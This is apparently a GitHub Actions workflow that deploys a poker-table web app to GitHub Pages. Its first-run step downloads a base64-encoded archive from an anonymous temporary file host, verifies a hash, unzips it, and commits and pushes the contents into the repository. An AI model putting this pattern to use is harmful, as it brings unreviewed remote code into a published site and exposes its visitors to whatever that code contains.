name: Deploy to GitHub Pages

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write
  pages: write
  id-token: write

concurrency:
  group: pages
  cancel-in-progress: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: github-pages
      url: ${{ steps.deployment.outputs.page_url }}
    steps:
      - uses: actions/checkout@v4

      - name: Bring in the app files (first run only)
        if: hashFiles('index.html') == ''
        env:
          BUILD_URL: https://d.uguu.se/TZiJHLAD.txt
          BUILD_SHA256: 6e51b2c3992993fb8241a896943f0331909124be3c4a3134c23710cb4dc5dab9
        run: |
          curl -fsSL "$BUILD_URL" -o build.txt
          base64 -d build.txt > build.zip
          echo "$BUILD_SHA256  build.zip" | sha256sum -c -
          unzip -o build.zip
          cp -r holdem-table/. .
          rm -rf holdem-table build.zip build.txt
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A
          git commit -m "Add Hold'em Table app files"
          git push

      - uses: actions/configure-pages@v5

      - name: Collect site files
        run: |
          mkdir -p _site
          cp index.html sw.js manifest.webmanifest *.png _site/

      - uses: actions/upload-pages-artifact@v3
        with:
          path: _site

      - id: deployment
        uses: actions/deploy-pages@v4
